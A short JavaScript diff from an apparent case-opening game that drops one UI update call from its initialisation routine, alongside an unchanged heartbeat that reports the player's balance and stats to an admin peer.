-    renderChanceBtns();renderInventory();renderCases();updateCards();updateBalance();updateStatsUI();updateInfo();updateTargetHint();renderHistory();renderAch();checkAch();renderLiveFeed();
+    renderChanceBtns();renderInventory();renderCases();updateCards();updateBalance();updateStatsUI();updateInfo();renderHistory();renderAch();checkAch();renderLiveFeed();
     initPeer();
     setInterval(() => { if(adminConn&&adminConn.open) sendToAdmin({type:'heartbeat',ip:USER_IP,balance:state.balance,drops:state.stats.total,ts:Date.now()}); }, 15000);
 }
